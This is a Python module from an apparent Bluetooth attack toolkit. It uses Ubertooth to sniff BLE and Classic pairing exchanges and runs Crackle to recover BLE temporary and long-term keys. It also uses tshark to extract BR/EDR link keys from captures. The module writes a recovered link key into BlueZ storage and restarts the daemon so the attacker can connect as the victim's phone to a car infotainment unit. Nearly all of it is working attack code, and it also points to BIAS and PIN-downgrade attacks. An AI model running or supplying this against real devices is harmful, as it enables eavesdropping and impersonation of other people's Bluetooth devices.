"""Ubertooth + Crackle integration for BLE/BR-EDR pairing capture and link key cracking.

Ubertooth One is a 2.4 GHz SDR that can passively sniff Bluetooth BR/EDR and BLE
traffic, including pairing exchanges. Combined with Crackle (BLE TK cracker) or
direct LMP analysis, captured pairing can yield link keys for impersonation.

Workflow:
  1. Scan for active piconets (ubertooth-scan)
  2. Follow target device's piconet (ubertooth-btbb -t <LAP>)
  3. Sniff pairing exchange between phone and IVI
  4. Crack captured pairing to extract link key (crackle for BLE, LMP analysis for BR/EDR)
  5. Inject link key into BlueZ and connect as the phone

Hardware required:
  - Ubertooth One (or compatible: Sena UD100, etc.)
  - USB connection to host

Software required:
  - ubertooth-tools (ubertooth-scan, ubertooth-btbb, ubertooth-btle)
  - crackle (BLE pairing cracker)
  - wireshark/tshark (optional, for pcap analysis)
  - btlejack (optional, alternative BLE sniffer)

References:
  - https://ubertooth.readthedocs.io/
  - https://github.com/mikeryan/crackle
  - Ryan, M. "Bluetooth: With Low Energy Comes Low Security" USENIX WOOT 2013
"""

import os
import re
import time
import signal
import subprocess

from bt_tap.utils.bt_helpers import run_cmd, check_tool
from bt_tap.utils.output import (
    info, success, error, warning, verbose,
    phase, step, substep,
)


# ── Ubertooth Piconet Scanner ───────────────────────────────────────────────

class UbertoothCapture:
    """Ubertooth wrapper for Bluetooth traffic capture.

    Supports both BR/EDR (Classic) piconet sniffing via ubertooth-btbb
    and BLE advertisement/connection sniffing via ubertooth-btle.
    """

    def __init__(self):
        self._proc = None

    @staticmethod
    def is_available() -> bool:
        """Check if Ubertooth tools are installed."""
        return check_tool("ubertooth-scan") or check_tool("ubertooth-btbb")

    def scan_piconets(self, duration: int = 30) -> list[dict]:
        """Scan for active BR/EDR piconets using Ubertooth.

        Returns list of discovered piconets with LAP, UAP, and signal info.
        Requires Ubertooth One hardware.
        """
        if not check_tool("ubertooth-scan"):
            error("ubertooth-scan not found. Install: apt install ubertooth")
            return []

        with phase("Ubertooth Piconet Scan"):
            info(f"Scanning for active piconets ({duration}s)...")
            info("Listening on 2.4 GHz for BR/EDR baseband traffic")

            result = run_cmd(
                ["ubertooth-scan", "-t", str(duration)],
                timeout=duration + 10,
            )

            piconets = []
            if result.returncode == 0 and result.stdout:
                for line in result.stdout.splitlines():
                    # Parse LAP/UAP from ubertooth-scan output
                    # Format varies: "LAP=XXXXXX UAP=XX ..."
                    lap_m = re.search(r"LAP[=:\s]+([0-9A-Fa-f]{6})", line)
                    uap_m = re.search(r"UAP[=:\s]+([0-9A-Fa-f]{2})", line)
                    if lap_m:
                        entry = {
                            "lap": lap_m.group(1).upper(),
                            "uap": uap_m.group(1).upper() if uap_m else "??",
                            "raw": line.strip(),
                        }
                        # Deduplicate by LAP
                        if not any(p["lap"] == entry["lap"] for p in piconets):
                            piconets.append(entry)

                success(f"Found {len(piconets)} active piconet(s)")
                for p in piconets:
                    substep(f"LAP: {p['lap']}  UAP: {p['uap']}")
            else:
                warning("No piconets detected (check Ubertooth connection)")
                if result.stderr:
                    verbose(f"stderr: {result.stderr.strip()}")

        return piconets

    def follow_piconet(
        self,
        target_address: str,
        output_pcap: str = "bt_capture.pcap",
        duration: int = 120,
    ) -> dict:
        """Follow a specific device's piconet and capture traffic to pcap.

        Uses the LAP (lower 24 bits of BD_ADDR) to lock onto the target's
        frequency hopping sequence and capture all piconet traffic.

        Args:
            target_address: Target BD_ADDR (AA:BB:CC:DD:EE:FF).
                           LAP is extracted from the lower 3 octets.
            output_pcap: Output pcap file path.
            duration: Capture duration in seconds.
        """
        if not check_tool("ubertooth-btbb"):
            error("ubertooth-btbb not found. Install: apt install ubertooth")
            return {"success": False, "error": "ubertooth-btbb not installed"}

        # Extract LAP from MAC address (lower 3 bytes)
        octets = target_address.replace("-", ":").split(":")
        if len(octets) != 6:
            error(f"Invalid MAC address: {target_address}")
            return {"success": False, "error": "invalid MAC"}
        lap = "".join(octets[3:6])  # Last 3 octets = LAP

        with phase("Ubertooth Piconet Follow"):
            info(f"Following piconet LAP={lap} for {duration}s")
            info(f"Output: {output_pcap}")

            cmd = [
                "ubertooth-btbb",
                "-l", lap,           # Target LAP
                "-c", output_pcap,   # Output pcap
                "-q",                # Quiet (less console spam)
            ]

            with step("Capturing piconet traffic"):
                try:
                    self._proc = subprocess.Popen(
                        cmd,
                        stdout=subprocess.PIPE,
                        stderr=subprocess.PIPE,
                    )
                    info(f"Ubertooth capture started (PID {self._proc.pid})")

                    # Wait for duration or until interrupted
                    try:
                        self._proc.wait(timeout=duration)
                    except subprocess.TimeoutExpired:
                        self._proc.send_signal(signal.SIGINT)
                        self._proc.wait(timeout=5)

                except FileNotFoundError:
                    error("ubertooth-btbb binary not found")
                    return {"success": False, "error": "binary not found"}
                except Exception as e:
                    error(f"Capture error: {e}")
                    return {"success": False, "error": str(e)}
                finally:
                    self._proc = None

            # Check output
            if os.path.exists(output_pcap):
                size = os.path.getsize(output_pcap)
                success(f"Captured {size} bytes to {output_pcap}")
                return {
                    "success": True,
                    "pcap": output_pcap,
                    "size": size,
                    "duration": duration,
                    "lap": lap,
                }
            else:
                warning("No pcap file produced (no traffic captured?)")
                return {"success": False, "error": "no output file"}

    def sniff_ble_pairing(
        self,
        output_pcap: str = "ble_pairing.pcap",
        duration: int = 120,
        follow_addr: str | None = None,
    ) -> dict:
        """Sniff BLE connections/pairing using ubertooth-btle.

        Captures BLE link layer traffic including pairing exchanges
        (Key Exchange, DHKey Check, etc.) that Crackle can crack.

        Args:
            output_pcap: Output pcap file.
            duration: Capture duration.
            follow_addr: Optional BLE address to follow (promiscuous if None).
        """
        if not check_tool("ubertooth-btle"):
            error("ubertooth-btle not found. Install: apt install ubertooth")
            return {"success": False, "error": "ubertooth-btle not installed"}

        with phase("BLE Pairing Sniff"):
            cmd = ["ubertooth-btle", "-p", "-c", output_pcap]
            if follow_addr:
                cmd.extend(["-t", follow_addr])
                info(f"Sniffing BLE pairing for {follow_addr} ({duration}s)")
            else:
                info(f"Sniffing all BLE connections ({duration}s, promiscuous)")

            with step("Capturing BLE link layer"):
                try:
                    self._proc = subprocess.Popen(
                        cmd,
                        stdout=subprocess.PIPE,
                        stderr=subprocess.PIPE,
                    )
                    try:
                        self._proc.wait(timeout=duration)
                    except subprocess.TimeoutExpired:
                        self._proc.send_signal(signal.SIGINT)
                        self._proc.wait(timeout=5)
                except Exception as e:
                    error(f"BLE sniff error: {e}")
                    return {"success": False, "error": str(e)}
                finally:
                    self._proc = None

            if os.path.exists(output_pcap):
                size = os.path.getsize(output_pcap)
                success(f"Captured {size} bytes to {output_pcap}")
                return {"success": True, "pcap": output_pcap, "size": size}
            else:
                warning("No BLE traffic captured")
                return {"success": False, "error": "no output file"}

    def stop(self):
        """Stop any running capture."""
        if self._proc:
            try:
                self._proc.send_signal(signal.SIGINT)
                self._proc.wait(timeout=5)
            except (ProcessLookupError, subprocess.TimeoutExpired):
                try:
                    self._proc.kill()
                except ProcessLookupError:
                    pass
            self._proc = None
            info("Ubertooth capture stopped")


# ── Crackle Link Key Cracker ────────────────────────────────────────────────

class CrackleRunner:
    """Wrapper for Crackle — BLE pairing cracker.

    Crackle recovers the Temporary Key (TK) and Long Term Key (LTK) from
    a captured BLE pairing exchange. For Legacy Pairing (BT 4.0-4.1),
    the TK is 0 for Just Works or a 6-digit PIN for Passkey Entry —
    both trivially crackable.

    For LE Secure Connections (BT 4.2+), Crackle cannot crack the pairing
    directly, but can decrypt traffic if the TK/LTK is known.

    Limitations:
      - Only works on BLE (not Classic BR/EDR)
      - Requires captured pairing exchange (not just encrypted traffic)
      - LE Secure Connections with Numeric Comparison is NOT crackable
    """

    @staticmethod
    def is_available() -> bool:
        return check_tool("crackle")

    def crack_ble(self, pcap_file: str, output_pcap: str | None = None) -> dict:
        """Run Crackle on a captured BLE pairing exchange.

        Args:
            pcap_file: Input pcap with BLE pairing traffic.
            output_pcap: Optional output pcap with decrypted traffic.

        Returns:
            Dict with tk, ltk, success status, and crackle output.
        """
        if not self.is_available():
            error("crackle not found. Install: https://github.com/mikeryan/crackle")
            return {"success": False, "error": "crackle not installed"}

        if not os.path.exists(pcap_file):
            error(f"Pcap file not found: {pcap_file}")
            return {"success": False, "error": "file not found"}

        with phase("BLE Key Cracking"):
            cmd = ["crackle", "-i", pcap_file]
            if output_pcap:
                cmd.extend(["-o", output_pcap])
                info(f"Decrypted output: {output_pcap}")

            info(f"Running Crackle on {pcap_file}...")

            with step("Cracking BLE Temporary Key"):
                result = run_cmd(cmd, timeout=300)

            output = result.stdout + result.stderr
            verbose(f"Crackle output:\n{output}")

            parsed = self._parse_crackle_output(output)

            if parsed.get("tk"):
                success(f"TK recovered: {parsed['tk']}")
            if parsed.get("ltk"):
                success(f"LTK recovered: {parsed['ltk']}")
            if parsed.get("success"):
                success("Pairing cracked successfully")
            else:
                if "Secure Connections" in output:
                    warning("LE Secure Connections detected — not crackable by Crackle")
                elif "no pairing" in output.lower():
                    warning("No pairing exchange found in capture")
                else:
                    warning("Crackle did not recover keys")

        return parsed

    def _parse_crackle_output(self, output: str) -> dict:
        """Parse Crackle stdout for recovered keys."""
        result = {
            "success": False,
            "tk": None,
            "ltk": None,
            "raw_output": output,
        }

        # Crackle output patterns:
        # "TK found: 000000"
        # "LTK found: aabbccdd..."
        # "Successfully cracked"
        tk_m = re.search(r"TK\s*(?:found|=)[:\s]+([0-9A-Fa-f]+)", output)
        if tk_m:
            result["tk"] = tk_m.group(1)

        ltk_m = re.search(r"LTK\s*(?:found|=)[:\s]+([0-9A-Fa-f]+)", output)
        if ltk_m:
            result["ltk"] = ltk_m.group(1)

        if result["tk"] or result["ltk"] or "successfully" in output.lower():
            result["success"] = True

        return result


# ── BR/EDR Link Key Extraction ──────────────────────────────────────────────

class LinkKeyExtractor:
    """Extract and inject BR/EDR link keys for Classic Bluetooth impersonation.

    After capturing a BR/EDR pairing exchange (via Ubertooth), the link key
    can sometimes be derived from the captured LMP packets. This class also
    handles injecting recovered link keys into BlueZ's storage so that
    bluetoothctl can connect using the stolen key.

    BlueZ stores link keys in:
      /var/lib/bluetooth/<adapter_mac>/<remote_mac>/info

    The [LinkKey] section contains:
      Key=<hex_key>
      Type=<type>
      PINLength=<length>
    """

    BLUEZ_BT_DIR = "/var/lib/bluetooth"

    def extract_from_pcap(self, pcap_file: str) -> dict:
        """Attempt to extract BR/EDR link key from captured pairing pcap.

        Uses tshark to parse LMP pairing frames. Only works if the full
        pairing exchange was captured (both Kinit and link key derivation).

        Note: This is opportunistic. BR/EDR E21/E22 key derivation from
        captured traffic requires knowing or brute-forcing the PIN. For
        SSP (Secure Simple Pairing), the ECDH exchange means passive
        sniffing alone cannot recover the link key.
        """
        if not check_tool("tshark"):
            warning("tshark not found — cannot parse pcap for link keys")
            return {"success": False, "error": "tshark not installed"}

        if not os.path.exists(pcap_file):
            error(f"Pcap not found: {pcap_file}")
            return {"success": False, "error": "file not found"}

        with phase("BR/EDR Link Key Extraction"):
            info(f"Analyzing {pcap_file} for pairing frames...")

            # Extract LMP pairing-related frames
            result = run_cmd([
                "tshark", "-r", pcap_file,
                "-Y", "btlmp.op == 11 || btlmp.op == 12 || btlmp.op == 17",
                "-T", "fields",
                "-e", "btlmp.op",
                "-e", "btlmp.key",
            ], timeout=30)

            if result.returncode != 0:
                warning(f"tshark failed: {result.stderr.strip()}")
                return {"success": False, "error": "tshark parse failed"}

            # Look for key material in output
            keys = []
            for line in result.stdout.splitlines():
                parts = line.split("\t")
                if len(parts) >= 2 and parts[1]:
                    key_hex = parts[1].replace(":", "").strip()
                    if len(key_hex) == 32:  # 128-bit link key
                        keys.append(key_hex.upper())

            if keys:
                success(f"Found {len(keys)} potential link key(s)")
                return {"success": True, "keys": keys}
            else:
                info("No complete link keys found in capture")
                info("BR/EDR SSP uses ECDH — passive sniffing alone may not suffice")
                info("Consider: BIAS attack, or force re-pairing with downgraded PIN")
                return {"success": False, "keys": [], "note": "SSP ECDH prevents passive extraction"}

    def inject_link_key(
        self,
        adapter_mac: str,
        remote_mac: str,
        link_key: str,
        key_type: int = 4,
    ) -> bool:
        """Inject a link key into BlueZ storage for a remote device.

        This allows bluetoothctl to connect to the remote device using the
        injected key, bypassing the normal pairing process.

        Args:
            adapter_mac: Local adapter MAC (e.g., from hciconfig).
            remote_mac: Remote device MAC.
            link_key: 128-bit hex link key (32 hex chars).
            key_type: BlueZ key type (4=authenticated, 5=unauthenticated).
        """
        if len(link_key) != 32:
            error(f"Link key must be 32 hex chars, got {len(link_key)}")
            return False

        adapter_dir = adapter_mac.upper().replace("-", ":")
        remote_dir = remote_mac.upper().replace("-", ":")

        info_dir = os.path.join(self.BLUEZ_BT_DIR, adapter_dir, remote_dir)
        info_file = os.path.join(info_dir, "info")

        with phase("Link Key Injection"):
            with step(f"Injecting key into BlueZ for {remote_mac}"):
                os.makedirs(info_dir, exist_ok=True)

                # Read existing info file if present
                existing = ""
                if os.path.exists(info_file):
                    with open(info_file) as f:
                        existing = f.read()

                # Update or add [LinkKey] section
                key_section = f"[LinkKey]\nKey={link_key.upper()}\nType={key_type}\nPINLength=0\n"

                if "[LinkKey]" in existing:
                    # Replace existing LinkKey section
                    new_content = re.sub(
                        r"\[LinkKey\]\n(?:.*\n)*?(?=\[|\Z)",
                        key_section,
                        existing,
                    )
                else:
                    new_content = existing.rstrip() + "\n\n" + key_section

                with open(info_file, "w") as f:
                    f.write(new_content)

                success(f"Link key injected: {info_file}")
                info("Restart bluetoothd for changes to take effect:")
                info("  sudo systemctl restart bluetooth")

            # Restart BlueZ to pick up the new key
            with step("Restarting BlueZ daemon"):
                result = run_cmd(["sudo", "systemctl", "restart", "bluetooth"], timeout=10)
                if result.returncode == 0:
                    success("BlueZ restarted — link key active")
                    time.sleep(2)  # Wait for daemon
                else:
                    warning("Could not restart BlueZ (may need manual restart)")

        return True

    def get_adapter_mac(self, hci: str = "hci0") -> str | None:
        """Get the current MAC address of the local adapter."""
        result = run_cmd(["hciconfig", hci], timeout=5)
        if result.returncode == 0:
            m = re.search(r"BD Address:\s*([0-9A-Fa-f:]{17})", result.stdout)
            if m:
                return m.group(1).upper()
        return None
